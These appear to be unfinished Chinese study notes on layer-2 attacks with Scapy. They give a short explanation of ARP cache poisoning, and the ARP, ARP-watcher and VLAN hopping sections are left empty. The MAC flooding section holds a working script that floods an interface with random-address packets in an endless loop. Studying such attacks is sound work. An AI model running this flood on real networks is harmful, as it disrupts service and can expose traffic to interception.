# 综述

osi-2: 在以太网中MAC地址为寻址的包作出响应。

模块：Scapy，可以生成OSI所有层的包。比如，ARP 、 IP/ICMP 、TCP/UDP 、 DNS/DHCP，以及不常用的协议，BOOTP, GPRS, PPPoE, SNMP, Radius, Infrared, L2CAP/HCI, EAP。

## ARP缓存投毒

起因：

IP包在发送之前要通过ARP协议找到目的地址的MAC.多数操作系统都可以响应自己从未执行查询的包。

实现：将请求方的MAC地址作为查询结果，对其进行返回

代码：

```python

```

## ARP观察者

## MAC洪水攻击

```python
#!/usr/bin/python
import sys
from scapy.all import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"), 
                dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*")) / \
         ICMP()

if len(sys.argv) < 2:
    dev = "eth0"
else:
    dev = sys.argv[1]

print("Flooding net with random packets on dev " + dev)

sendp(packet, iface=dev, loop=1)
```

## VLAN跳跃攻击

```python
```

